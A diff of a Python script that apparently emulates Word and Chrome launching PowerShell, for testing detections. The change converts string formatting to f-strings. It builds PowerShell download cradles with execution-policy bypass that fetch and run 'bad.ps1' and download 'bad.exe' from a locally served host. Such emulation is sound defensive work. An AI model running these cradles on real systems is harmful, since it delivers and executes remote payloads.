@@ -19,14 +19,17 @@ from . import common
 def main():
     cmd_path = "c:\\windows\\system32\\cmd.exe"
     server, ip, port = common.serve_web()
-    url = 'http://{}:{}/bad.ps1'.format(ip, port)
+    url = f'http://{ip}:{port}/bad.ps1'
 
-    cmds = ["powershell -ep bypass -c iex(new-object net.webclient).downloadstring('{}')".format(url),
-            "powershell -ep bypass -c (new-object net.webclient).downloadfile('{}', 'bad.exe')".format(url)]
+    cmds = [
+        f"powershell -ep bypass -c iex(new-object net.webclient).downloadstring('{url}')",
+        f"powershell -ep bypass -c (new-object net.webclient).downloadfile('{url}', 'bad.exe')",
+    ]
+
 
     # emulate word and chrome
     for user_app in ["winword.exe", "chrome.exe"]:
-        common.log("Emulating {}".format(user_app))
+        common.log(f"Emulating {user_app}")
         user_app_path = os.path.abspath(user_app)
         common.copy_file(cmd_path, user_app_path)
 
